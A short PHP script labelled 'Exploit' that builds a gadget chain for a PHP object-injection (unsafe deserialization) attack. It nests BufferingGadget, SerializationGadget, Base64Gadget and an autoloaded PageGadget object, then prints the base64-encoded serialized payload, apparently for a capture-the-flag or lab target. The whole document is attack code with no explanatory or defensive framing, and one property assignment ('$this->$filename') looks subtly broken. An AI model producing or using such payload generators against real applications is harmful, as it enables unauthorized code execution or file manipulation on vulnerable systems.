
<?php

// Exploit

function autoload($class_name)
{
    include "gadgets/$class_name.class.php";
}

class BufferingGadget{
    private $filename;

    public function set($f){
        $this->$filename = $f;
    }
}

class SerializationGadget{
    private $payload;
    private $filename='';

    public function set($s){
        $this->payload = $s;
    }
}

class Base64Gadget{
    private $str='';
    
    public $filename='';
    public $text;

    public function __construct()
    {
        $this->filename = 'test';
    }

    public function set($v){
        $this->text = $v;
        

    }
}
spl_autoload_register('autoload');



$ser = new SerializationGadget;
$buff = new BufferingGadget;

$ser->set($buff);

$page = new PageGadget;

$b64_1 = new Base64Gadget;
$b64_2 = new Base64Gadget;


$b64_1->set($b64_2);

$page->set([], $ser, $b64_1);

print_r($page);

echo base64_encode(serialize($page));
echo "\n";

